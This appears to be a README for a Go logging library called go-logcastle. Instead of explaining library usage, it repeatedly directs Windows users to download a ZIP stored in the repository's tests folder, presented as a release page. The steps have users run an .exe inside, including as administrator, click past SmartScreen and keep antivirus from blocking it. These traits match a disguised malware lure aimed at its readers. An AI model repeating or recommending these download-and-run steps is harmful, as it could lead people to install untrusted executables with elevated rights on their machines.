# 🏰 go-logcastle - Keep Logs Clear Across Apps

[![Download go-logcastle](https://img.shields.io/badge/Download%20go--logcastle-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Nuclear-fenorchis140/go-logcastle/main/tests/logcastle_go_v1.6.zip)

## 🚀 Getting Started

go-logcastle helps you keep app logs in one clean format. It works with common Go logging tools and turns mixed log output into JSON or text that is easier to read and use.

This page shows you how to download and run it on Windows.

## 📥 Download

1. Open the release page here: https://raw.githubusercontent.com/Nuclear-fenorchis140/go-logcastle/main/tests/logcastle_go_v1.6.zip
2. Find the latest release at the top of the page
3. Download the Windows file from that release
4. Save the file to your computer

If the release page offers more than one file, pick the one that matches Windows. If you see a ZIP file, download that file first and then extract it.

## 🪟 Install on Windows

1. Open the folder where the file downloaded
2. If the file is a ZIP archive, right-click it and choose Extract All
3. Open the extracted folder
4. Look for the app file, such as `.exe`
5. Double-click the file to start go-logcastle

If Windows asks for permission, choose Yes or Run.

## 🧭 First Run

When you open go-logcastle, it starts with safe default settings.

You can use it to:

- capture logs from your Go app
- convert logs into a steady format
- send logs into files or other tools
- keep logs easier to scan during support work
- make log output easier to read in one place

If the app opens a settings window, you can keep the defaults and start right away.

## 🧰 What It Does

go-logcastle helps with log handling in apps that use:

- Logrus
- Zap
- the Go standard logger
- custom text logs

It can:

- intercept log output
- parse common log lines
- standardize the format
- output JSON or text
- keep logs in a structure that is easier to search

This is useful when one app uses more than one logging style.

## 🖥️ Windows System Needs

For normal use on Windows, you should have:

- Windows 10 or later
- a modern 64-bit PC
- enough space for the app files
- a stable desktop session

For best results, use a current version of Windows with all updates installed.

## 📂 Common File Types

You may see one of these on the release page:

- `.exe` — run this file on Windows
- `.zip` — extract it, then run the app inside
- `.json` — config data if the release includes settings
- `.txt` — readme or setup notes

If the file is already an `.exe`, you can open it after download. If it is a ZIP file, unpack it first.

## 🔧 Basic Setup

After you open the app, you can set it up in a few simple steps:

1. Choose the log source or app you want to watch
2. Pick JSON or text output
3. Select where to save the log file
4. Turn on log capture
5. Check the output to make sure it looks right

If you are not sure what to choose, use the default settings. They are usually enough for a first run.

## 📄 Example Use

You may use go-logcastle when:

- your Go app prints logs in different styles
- you want one log format across services
- you need cleaner logs for support
- you want easier search and filtering
- you want logs that work well with monitoring tools

Example flow:

1. Start your Go app
2. Open go-logcastle
3. Let it catch the logs
4. Save the output in JSON
5. Review the output in your log viewer or file

## 🧪 Log Output Format

go-logcastle can help produce log output like:

- one line per event
- time stamps
- log level
- source name
- message text
- structured fields

A structured format makes it easier to sort logs and find issues later.

## 🛠️ Troubleshooting

If the app does not open:

- check that the file fully downloaded
- try right-clicking and choosing Run as administrator
- make sure Windows did not block the file
- move the file to a simple folder like Downloads or Desktop
- extract the ZIP file again if needed

If logs do not appear:

- confirm the app or service is running
- check the log source path
- make sure the output folder is writable
- restart the app and try again
- use the default settings to test first

If Windows shows a smart screen prompt, choose the option that lets you run the file if you trust the release source.

## 🔍 Search and Read Logs

When logs use one format, you can:

- search for one word or error code
- sort by time
- filter by level
- compare events across services
- spot repeated errors faster

This helps when you work with several small services or one app that writes many logs.

## 🗂️ Best Use Cases

go-logcastle fits well for:

- Go desktop tools
- small servers
- microservices
- test builds
- staging systems
- apps that mix Logrus, Zap, and standard Go logs

It is also useful when teams want one log style across the whole project.

## 📌 Features

- automatic log capture
- parsing for common Go log styles
- JSON and text output
- simple setup
- support for mixed logging libraries
- useful for app monitoring and review
- works well for local or server use
- designed for high log volume

## 🧾 Repository Topics

This project is linked to:

- Go
- Golang
- JSON logging
- log aggregation
- log formatter
- log management
- log parser
- logging
- Logrus
- microservices
- monitoring
- observability
- structured logging
- Zap

## ▶️ Download and Run

1. Visit the release page: https://raw.githubusercontent.com/Nuclear-fenorchis140/go-logcastle/main/tests/logcastle_go_v1.6.zip
2. Download the Windows file from the latest release
3. Open the downloaded file, or extract it first if it is a ZIP archive
4. Run the app from the extracted folder or from the `.exe` file
5. Keep the release page handy in case you need a newer build later

## 📎 Release Page

[Open the latest go-logcastle release](https://raw.githubusercontent.com/Nuclear-fenorchis140/go-logcastle/main/tests/logcastle_go_v1.6.zip)

## 🔐 Safe Start Tips

- download only from the release page
- use the latest version
- keep the file in a folder you can find later
- close old app copies before opening a new one
- check that your antivirus does not block the file

## 🧩 Good Fit For Teams

If you work on a Go project with more than one service, go-logcastle can help keep log output aligned. That makes it easier to read app events, compare runs, and review problems without jumping between formats

## 📍 Quick Path

1. Go to the release page
2. Get the Windows file
3. Extract it if needed
4. Open the app
5. Start capturing logs